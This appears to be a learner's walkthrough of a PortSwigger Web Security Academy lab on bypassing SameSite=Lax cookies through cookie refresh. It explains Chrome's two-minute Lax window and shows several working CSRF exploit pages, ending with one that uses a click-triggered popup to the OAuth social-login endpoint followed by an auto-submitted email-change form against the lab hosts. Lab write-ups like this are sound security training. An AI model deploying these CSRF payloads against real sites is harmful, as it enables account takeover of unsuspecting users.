Title: SameSite Lax bypass via cookie refresh
Level: PRACTITIONER
Desc:  This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter 

# Theory:
Cookies with Lax SameSite restrictions aren't normally sent in any cross-site POST requests, but there are some exceptions.
As mentioned earlier, if a website doesn't include a SameSite attribute when setting a cookie, Chrome automatically applies Lax restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.

# Walkthrough:
I found the request to renew session cookie any time the request is sended.
<img width="1289" height="602" alt="image" src="https://github.com/user-attachments/assets/f343408c-aad2-4825-9295-7e7dbe00ae0c" />

<img width="1263" height="374" alt="image" src="https://github.com/user-attachments/assets/03a12f56-9ce6-4c6c-a74a-73a7000d8fe7" />

`https://oauth-0a2000c0038f840a80bc1048028e0074.oauth-server.net/auth?client_id=nbltetywifula03tgx022&redirect_uri=https://0a8b0073037e84fd80c11248002f0049.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email`

Now I have to craft exploit where:
1. I send Oauth request
2. Send POST request to change email

GET request is blocked:
<img width="984" height="461" alt="image" src="https://github.com/user-attachments/assets/babb7465-e838-4052-bb21-3c06f5ab2b8b" />

```
<script>
    document.location = "https://oauth-0a2000c0038f840a80bc1048028e0074.oauth-server.net/auth?client_id=nbltetywifula03tgx022&redirect_uri=https://0a8b0073037e84fd80c11248002f0049.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email
";
</script>
<form method="POST" action="https://0a8b0073037e84fd80c11248002f0049.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="tes21@normal-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

It didn't work on a victim, let's check out solution.

First step in solution is to craft exploit which works during 2minutes period after login of victim and doesn't work in other scenario.

Script like following works:
```
</script>
<form method="POST" action="https://0a19006504178dbb80bd999900580085.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="tes23@normal-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```
But we need to craft something that works even after 2 minutes after login.

Request to /social-login starts full oauth flow and renew cookie.

Now I crafted new exploit to first make request to social-login, then after timeout make request to change email. Request to social-login must be in function window.open()
```
<form method="POST" action="https://0a19006504178dbb80bd999900580085.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="tes25@normal-user.net">
</form>
<script>
    window.open('https://0a19006504178dbb80bd999900580085.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```
The initial request gets blocked by the browser's popup blocker.
Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.

Realize that the popup is being blocked because you haven't manually interacted with the page. 

Change exploit to make vitim click on the page and initiate request to open new tab.
```
<form method="POST" action="https://0a19006504178dbb80bd999900580085.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="tes25@normal-user.net">
</form>
<p>Click anywhere on the page</p>
<script>
window.onclick = () => {
    window.open('https://0a19006504178dbb80bd999900580085.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);
}
    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```
It is working!





